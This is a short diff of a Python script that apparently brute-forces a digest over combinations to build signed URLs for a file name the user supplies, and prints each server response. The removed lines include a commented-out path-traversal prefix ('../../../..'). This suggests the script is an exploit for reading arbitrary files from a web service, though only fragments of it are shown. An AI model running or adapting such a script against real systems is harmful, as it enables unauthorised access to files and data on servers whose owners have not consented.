@@ -17,7 +17,6 @@ padding_byte = b"\xff"
 append_nonce = b"\x9e\xe0\xe7\xc0\xa1\xe3\xb5\xda\xde\xe0\xe7\xc0\xa1\xe3\xb5\xda"
 
 file = input ("File: ")
-#file = "../../../..{}".format(file)
 
 print ("FILENAME --> {}".format(file))
 file = file.encode("utf-8")
@@ -34,7 +33,6 @@ for combination in product(*ranges):
 	url = base_url.format(file, uuid, digest)
 	print ("ATTEMPTING DIGEST --> {}".format(digest))
 	r = requests.get(url)
-	#print ("RESPONSE --> {}...".format(r.text[0:min(50, len(r.text))]))
 	#print ("RESPONSE --> {}".format(r.text))
 	if "Status Id Too Long" in r.text:
 		print (" --> ERROR!!! Status Id Too Long !!!")
